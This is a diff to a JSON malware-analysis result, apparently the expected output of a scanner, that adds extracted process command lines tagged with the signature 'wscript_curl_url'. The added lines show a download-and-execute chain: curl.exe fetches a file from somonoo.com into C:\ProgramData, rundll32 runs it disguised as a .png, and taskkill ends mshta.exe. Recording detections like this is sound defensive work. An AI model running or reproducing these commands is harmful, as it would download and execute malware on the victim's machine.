@@ -247,6 +247,15 @@
           }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gif",
+                "rundll32 C:\\ProgramData\\aj0iG.png,Wind ",
+                "taskkill /f /im mshta.exe"
+              ]
+            }
+          },
           "network": {
             "dynamic": {
               "domain": [
@@ -378,6 +387,29 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gif"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "rundll32 C:\\ProgramData\\aj0iG.png,Wind "
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "taskkill /f /im mshta.exe"
+        }
+      ],
       "file.string.extracted": [
         {
           "heur_id": 2,
